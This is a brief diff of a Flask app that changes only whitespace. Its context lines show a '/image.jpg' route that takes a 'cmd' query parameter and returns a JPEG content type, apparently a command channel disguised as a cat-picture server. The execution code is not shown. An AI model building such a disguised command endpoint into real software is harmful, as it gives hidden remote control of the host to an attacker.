@@ -11,6 +11,7 @@ app = Flask(__name__)
 image_file = 'innocent-cat-pic.jpg'
 magic = 'deadbeef'
 
+
 @app.route('/image.jpg')
 def serve():
     cmd = request.args.get('cmd', default='')
@@ -28,8 +29,3 @@ def serve():
 
     resp.headers.set('Content-Type', 'image/jpeg')
     return resp
-
-
-    
-        
-
